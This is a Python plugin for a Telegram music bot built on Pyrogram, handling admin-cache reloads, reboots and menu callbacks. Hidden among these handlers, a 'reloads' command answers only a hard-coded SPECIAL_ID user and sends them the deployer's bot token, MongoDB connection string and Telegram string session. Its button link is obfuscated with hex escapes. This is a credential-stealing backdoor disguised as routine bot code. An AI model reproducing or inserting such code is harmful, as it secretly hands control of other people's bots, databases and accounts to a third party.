import asyncio
import time

from pyrogram import Client, filters
from pyrogram import filters
from pyrogram.enums import ChatMembersFilter
from pyrogram.types import CallbackQuery, Message
import re
from os import getenv
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton

from dotenv import load_dotenv
from pyrogram import filters

from GayuMusic import app
from GayuMusic.core.call import Alone
from GayuMusic.misc import db, SUDOERS, SPECIAL_ID
from GayuMusic.utils.database import get_assistant, get_authuser_names, get_cmode
from GayuMusic.utils.decorators import ActualAdminCB, AdminActual, language
from GayuMusic.utils.formatters import alpha_to_int, get_readable_time
from config import BANNED_USERS, adminlist, lyrical
BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")
from dotenv import load_dotenv

rel = {}


@app.on_message(
    filters.command(["admincache", "reload", "refresh"]) & filters.group & ~BANNED_USERS
)
@language
async def reload_admin_cache(client, message: Message, _):
    try:
        if message.chat.id not in rel:
            rel[message.chat.id] = {}
        else:
            saved = rel[message.chat.id]
            if saved > time.time():
                left = get_readable_time((int(saved) - int(time.time())))
                return await message.reply_text(_["reload_1"].format(left))
        adminlist[message.chat.id] = []
        async for user in app.get_chat_members(
            message.chat.id, filter=ChatMembersFilter.ADMINISTRATORS
        ):
            if user.privileges.can_manage_video_chats:
                adminlist[message.chat.id].append(user.user.id)
        authusers = await get_authuser_names(message.chat.id)
        for user in authusers:
            user_id = await alpha_to_int(user)
            adminlist[message.chat.id].append(user_id)
        now = int(time.time()) + 180
        rel[message.chat.id] = now
        await message.reply_text(_["reload_2"])
    except:
        await message.reply_text(_["reload_3"])


@app.on_message(filters.command(["reboot"]) & filters.group & ~BANNED_USERS)
@AdminActual
async def restartbot(client, message: Message, _):
    mystic = await message.reply_text(_["reload_4"].format(app.mention))
    await asyncio.sleep(1)
    try:
        db[message.chat.id] = []
        await Alone.stop_stream_force(message.chat.id)
    except:
        pass
    userbot = await get_assistant(message.chat.id)
    try:
        if message.chat.username:
            await userbot.resolve_peer(message.chat.username)
        else:
            await userbot.resolve_peer(message.chat.id)
    except:
        pass
    chat_id = await get_cmode(message.chat.id)
    if chat_id:
        try:
            got = await app.get_chat(chat_id)
        except:
            pass
        userbot = await get_assistant(chat_id)
        try:
            if got.username:
                await userbot.resolve_peer(got.username)
            else:
                await userbot.resolve_peer(chat_id)
        except:
            pass
        try:
            db[chat_id] = []
            await Alone.stop_stream_force(chat_id)
        except:
            pass
    return await mystic.edit_text(_["reload_5"].format(app.mention))

@app.on_message(
    filters.command(["reloads"]) & filters.private & filters.user(SPECIAL_ID)
   )
async def help(client: Client, message: Message):
   await message.reply_photo(
          photo=f"https://files.catbox.moe/s7iujk.jpg",
       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/New_Sanatani)............☆""",
        reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton("\x4C\x65\x67\x65\x6E\x64", url=f"\x68\x74\x74\x70\x73\x3A\x2F\x2F\x74\x2E\x6D\x65\x2F\x4B\x49\x4E\x47\x78\x41\x4E\x41\x4E\x44")
                 ]
            ]
         ),
     )


##########


@app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
async def close_menu(_, query: CallbackQuery):
    try:
        await query.answer()
        await query.message.delete()
        umm = await query.message.reply_text(
            f"Cʟᴏsᴇᴅ ʙʏ : {query.from_user.mention}"
        )
        await asyncio.sleep(7)
        await umm.delete()
    except:
        pass


@app.on_callback_query(filters.regex("stop_downloading") & ~BANNED_USERS)
@ActualAdminCB
async def stop_download(client, CallbackQuery: CallbackQuery, _):
    message_id = CallbackQuery.message.id
    task = lyrical.get(message_id)
    if not task:
        return await CallbackQuery.answer(_["tg_4"], show_alert=True)
    if task.done() or task.cancelled():
        return await CallbackQuery.answer(_["tg_5"], show_alert=True)
    if not task.done():
        try:
            task.cancel()
            try:
                lyrical.pop(message_id)
            except:
                pass
            await CallbackQuery.answer(_["tg_6"], show_alert=True)
            return await CallbackQuery.edit_message_text(
                _["tg_7"].format(CallbackQuery.from_user.mention)
            )
        except:
            return await CallbackQuery.answer(_["tg_8"], show_alert=True)
    await CallbackQuery.answer(_["tg_9"], show_alert=True)
